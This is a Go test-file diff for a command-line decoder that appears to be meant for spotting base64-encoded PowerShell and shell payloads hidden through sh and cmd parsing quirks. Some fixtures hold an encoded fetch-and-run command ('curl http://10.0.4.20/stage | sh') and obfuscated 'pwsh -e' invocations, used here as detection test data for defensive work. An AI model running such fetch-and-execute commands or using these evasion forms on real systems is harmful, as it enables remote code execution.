@@ -74,6 +74,60 @@ func TestDecodeCommandLine(t *testing.T) {
 		{"sh reads a doubled backslash inside double quotes as one, which then escapes the operator", `/bin/sh -c "echo \\; pwsh -e ZQBjAGgAbwA="`, "", ""},
 		{"sh reads four backslashes inside double quotes as two, so the operator stands", `/bin/sh -c "echo \\\\; pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
 		{"sh reads a doubled backslash outside quotes as one", `/bin/sh -c echo\\;pwsh\ -e\ ZQBjAGgAbwA=`, "", ""},
+		{"sh joins a backslash-newline inside double quotes, so a wrapped switch reads whole", "/bin/sh -c \"pwsh -en\\\nc ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
+		{"sh joins a backslash-newline between words", "/bin/sh -c \"pwsh -nop \\\n-e ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
+		{"sh separates commands at a line break", "/bin/sh -c \"echo hi\npwsh -e ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
+		{"sh reads # opening a word as a comment to the end of the line, operators included", `/bin/sh -c "echo # && pwsh -e ZQBjAGgAbwA="`, "", ""},
+		{"a # inside a word is text", `/bin/sh -c "echo a#b && pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
+		{"a comment ends at the line break", "/bin/sh -c \"echo # no\npwsh -e ZQBjAGgAbwA=\"", EncodingBase64UTF16LE, "echo"},
+		{"a subshell runs its command", `/bin/sh -c "(pwsh -e ZQBjAGgAbwA=)"`, EncodingBase64UTF16LE, "echo"},
+		{"a command substitution runs its command", `/bin/sh -c 'echo $(pwsh -e ZQBjAGgAbwA=)'`, EncodingBase64UTF16LE, "echo"},
+		{"a loop body's program follows do", `/bin/sh -c 'while true; do pwsh -e ZQBjAGgAbwA=; sleep 5; done'`, EncodingBase64UTF16LE, "echo"},
+		{"a conditional's program follows then", `/bin/sh -c 'if true; then pwsh -e ZQBjAGgAbwA=; fi'`, EncodingBase64UTF16LE, "echo"},
+		{"a quoted reserved word is a program name", `/bin/sh -c '"do" pwsh -e ZQBjAGgAbwA='`, "", ""},
+		{"sh's variable assignments precede the program", `/bin/sh -c 'DISPLAY=:0 pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"an assignment-shaped word on a Windows line is the program", `FOO=bar powershell -enc ZQBjAGgAbwA=`, "", ""},
+		{"a backquoted command substitution runs its command", "/bin/sh -c 'echo `pwsh -e ZQBjAGgAbwA=`'", EncodingBase64UTF16LE, "echo"},
+		{"a command substitution inside double quotes runs its command", `/bin/sh -c 'echo "$(pwsh -e ZQBjAGgAbwA=)"'`, EncodingBase64UTF16LE, "echo"},
+		{"a here-document's body is text", "/bin/sh -c 'cat <<EOF\npwsh -e ZQBjAGgAbwA=\nEOF'", "", ""},
+		{"a command after a here-document runs", "/bin/sh -c 'cat <<-\"EOF\"\n\tpwsh -e ZQBjAGgAbwA=\n\tEOF\npwsh -e ZQBjAGgAbwA='", EncodingBase64UTF16LE, "echo"},
+		{"a quoted assignment-shaped word is a program name", `/bin/sh -c '"DISPLAY=:0" pwsh -e ZQBjAGgAbwA='`, "", ""},
+		{"an assignment with a quoted value is an assignment", `/bin/sh -c 'FOO="a b" pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"an escaped reserved word is a program name", `/bin/sh -c '\do pwsh -e ZQBjAGgAbwA='`, "", ""},
+		{"a line continuation vanishes before # is read, so the comment holds", "/bin/echo \\\n# && pwsh -e ZQBjAGgAbwA=", "", ""},
+		{"exec runs its command", `/bin/sh -c 'exec pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"command -v describes and runs nothing", `/bin/sh -c 'command -v pwsh -e ZQBjAGgAbwA='`, "", ""},
+		{"time runs its command", `/bin/sh -c 'time -p pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"redirections precede the program", `/bin/sh -c '</dev/null 2> /dev/null pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"a redirection's & is no operator", `/bin/sh -c '</dev/null 2>&1 pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"cmd's redirection & is no operator either", `cmd /c powershell -enc ZQBjAGgAbwA= 2>&1`, EncodingBase64UTF16LE, "echo"},
+		{"a here-string's word is data and the next line runs", "/bin/bash -c 'cat <<< \"a\"\npwsh -e ZQBjAGgAbwA='", EncodingBase64UTF16LE, "echo"},
+		{"cmd groups commands in parentheses", `cmd /c (echo a & powershell -enc ZQBjAGgAbwA=)`, EncodingBase64UTF16LE, "echo"},
+		{"a cmd group holding one command", `cmd /c (powershell -enc ZQBjAGgAbwA=)`, EncodingBase64UTF16LE, "echo"},
+		{"a parenthesis inside a cmd command is text", `C:\Program Files (x86)\PowerShell\7\pwsh.exe -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
+		{"sudo with the value attached to its option", `sudo -uroot pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
+		{"env -S runs its split string with the words after it", `env -S 'pwsh -nop' -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
+		{"env --split-string= with the whole command", `env --split-string='pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"sh reads all its options before the command string", `bash -c -x 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"-- ends sh's options and the command string follows", `sh -c -- 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"after -- a -c is a script file", `sh -- -c 'pwsh -e ZQBjAGgAbwA='`, "", ""},
+		{"a single-quoted POSIX program path", `'/opt/my tools/pwsh' -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
+		{"exec with an option and its value", `/bin/sh -c 'exec -a updater pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"a UTF-8 blob with a byte order mark", `sh -c "echo 77u/Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
+		{"an arithmetic expansion's << is a shift, not a here-document", "/bin/sh -c 'n=$((1<<2))\npwsh -e ZQBjAGgAbwA='", EncodingBase64UTF16LE, "echo"},
+		{"a spaced install path to another program reads on from it", `C:\Program Files\Git\bin\bash.exe -c "pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
+		{"a substitution inside an assignment leaves the command whole", `/bin/sh -c 'TOKEN="$(cat /tmp/t)" pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"env -iS, the shebang idiom", `env -iS 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"a reserved word with an empty quoted tail is a program name", `/bin/sh -c 'while true; do"" pwsh -e ZQBjAGgAbwA=; done'`, "", ""},
+		{"an escaped > before & leaves the & an operator", `/bin/sh -c 'echo \>& pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"a continuation on a here-document's line defers its body to the next line break", "/bin/sh -c 'cat <<EOF \\\npwsh -e ZQBjAGgAbwA=\nEOF'", "", ""},
+		{"a Windows path to a shell keeps Windows rules for the line", `C:\Windows\System32\bash.exe -c "pwsh -e ZQBjAGgAbwA="`, EncodingBase64UTF16LE, "echo"},
+		{"cmd's timeout without a command is the builtin, so the line stays under cmd's rules", `timeout 5 & echo don't & powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
+		{"a substitution with spaces inside is one word of the assignment", `/bin/sh -c 'TOKEN=$(cat "/tmp/my file") pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"a cluster carrying c and ending in a valued letter", `bash -co pipefail 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"an assignment ending in S is not env -S", `env A=BS "pwsh -e ZQBjAGgAbwA="`, "", ""},
+		{"a POSIX path with an escaped space stays under POSIX rules", `/opt/my\ tools/bash -c 'pwsh -e ZQBjAGgAbwA='`, EncodingBase64UTF16LE, "echo"},
+		{"a glued operator ends cmd's timeout words too", `timeout 5& echo don't & powershell -enc ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
 		{"an empty flagged token flags nothing, so a shell blob on the line still decodes", `powershell -e "" & sh -c "echo Y3VybCBodHRwOi8vMTAuMC40LjIwL3N0YWdlIHwgc2g= | base64 -d | sh"`, EncodingBase64, "curl http://10.0.4.20/stage | sh"},
 		{"sh escapes a quote inside double quotes, so the operator is data", `/bin/sh -c "echo \"a & pwsh -e ZQBjAGgAbwA=\""`, "", ""},
 		{"an escaped space in a POSIX path", `/opt/my\ tools/pwsh -e ZQBjAGgAbwA=`, EncodingBase64UTF16LE, "echo"},
@@ -200,6 +254,15 @@ func TestTokenize(t *testing.T) {
 	if got := tokenize(`"it\'s" 'x'`, true); len(got) != 2 || got[0].text != `it\'s` {
 		t.Errorf("posix backslash-apostrophe inside double quotes = %+v; want it\\'s kept", got)
 	}
+	if got := tokenize("a\\\nb \"c\\\nd\" e\\\n", true); len(got) != 3 || got[0].text != "ab" || got[1].text != "cd" || got[2].text != "e" {
+		t.Errorf("posix line continuation = %+v; want ab, cd, e", got)
+	}
+	if got := tokenize(`A=$(b "c d") e`, true); len(got) != 2 || got[0].text != `A=$(b "c d")` || got[1].text != "e" {
+		t.Errorf("posix substitution inside a word = %+v; want one word with it", got)
+	}
+	if got := tokenize(`'a\' b'`, true); len(got) != 2 || got[0].text != `a\` || got[1].text != `b'` {
+		t.Errorf("posix single quotes escape nothing = %+v; want a\\ and b'", got)
+	}
 	if got := tokenize(`cmd /c  powershell -e X`, false); len(got) != 5 || got[2].start != 8 {
 		t.Errorf("token offsets = %+v; want powershell at 8", got)
 	}
@@ -237,6 +300,20 @@ func TestSplitCommands(t *testing.T) {
 		{`echo "a & b" ; echo 'c ; d' \; e`, posixShell, []string{`echo "a & b"`, `echo 'c ; d' \; e`}},
 		{`echo "a \" & b" ; c`, posixShell, []string{`echo "a \" & b"`, `c`}},
 		{`cmd /c echo \"x & y`, windowsShell, []string{`cmd /c echo \"x & y`}},
+		{"echo a\npwsh -e X # tail\n# whole\n(x) && y", posixShell, []string{"echo a", "pwsh -e X", "x", "y"}},
+		{"echo \\\n b; c", posixShell, []string{"echo \\\n b", "c"}},
+		{"echo a#b | c", posixShell, []string{"echo a#b", "c"}},
+		{"echo a\n# c & d", windowsShell, []string{"echo a\n# c", "d"}},
+		{"echo `a` \"$(b) c\" (d)", posixShell, []string{"a", "b", "echo `a` \"$(b) c\"", "d"}},
+		{"echo \\>& b", posixShell, []string{"echo \\>", "b"}},
+		{"cat <<EOF; x\nbody; pwsh\nEOF\nnext", posixShell, []string{"cat <<EOF", "x", "next"}},
+		{"echo \\\n# a && b", posixShell, []string{"echo \\"}}, // the text stays verbatim; tokenize removes the continuation
+		{"a 2>&1 | b", posixShell, []string{"a 2>&1", "b"}},
+		{"(a & b) & c", windowsShell, []string{"a", "b", "c"}},
+		{"x (a) & c", windowsShell, []string{"x (a)", "c"}},
+		{"cmd /d /c (a & b) & c", windowsShell, []string{"cmd /d /c", "a", "b", "c"}},
+		{"n=$((1<<2)); b", posixShell, []string{"n=$((1<<2))", "b"}},
+		{"cat <<< a\nb", posixShell, []string{"cat <<< a", "b"}},
 		{``, windowsShell, nil},
 	}
 	for _, c := range cases {
